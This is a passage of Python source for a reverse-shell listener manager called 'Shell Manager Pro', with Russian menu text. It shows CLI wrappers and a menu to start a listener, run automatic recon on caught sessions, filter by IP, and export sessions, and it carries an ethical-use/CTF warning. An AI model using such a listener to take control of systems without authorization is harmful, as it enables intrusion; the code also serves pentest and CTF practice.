def cli_repl(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
    repl(host=host, port=port)


def cli_repl_autorecon(host: str = DEFAULT_HOST,
                        port: int = DEFAULT_PORT) -> None:
    repl(host=host, port=port, autorecon=True)


def cli_export(fmt: str = "json") -> None:
    if not _server:
        console.print("[yellow]Listener не запущен.[/yellow]")
        return
    export_sessions(_server.list_sessions(), fmt=fmt)


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🐚 Shell Manager Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "REPL (запустить listener + интерактив)"),
        ("2", "REPL с autorecon"),
        ("3", "REPL с allowlist IP"),
        ("4", "Статус listener"),
        ("5", "Список сессий"),
        ("6", "Остановить listener"),
        ("7", "Экспорт сессий (json/html/md/csv)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для этичного использования и CTF."
                  "[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        host = Prompt.ask("Host", default=DEFAULT_HOST)
        port = IntPrompt.ask("Port", default=DEFAULT_PORT)
        repl(host=host, port=port)
    elif c == "2":
        host = Prompt.ask("Host", default=DEFAULT_HOST)
        port = IntPrompt.ask("Port", default=DEFAULT_PORT)
        repl(host=host, port=port, autorecon=True)
    elif c == "3":
        host = Prompt.ask("Host", default=DEFAULT_HOST)
        port = IntPrompt.ask("Port", default=DEFAULT_PORT)
        raw = Prompt.ask("Allowlist IP (через запятую)", default="")
        ips = [x.strip() for x in raw.split(",") if x.strip()]
        repl(host=host, port=port, allow_ips=ips)
    elif c == "4":
        cli_status()
    elif c == "5":
        cli_list()
    elif c == "6":
        cli_stop()
    elif c == "7":
        fmt = Prompt.ask("Формат",
                          choices=["json", "html", "md", "csv"],
                          default="json")
        cli_export(fmt)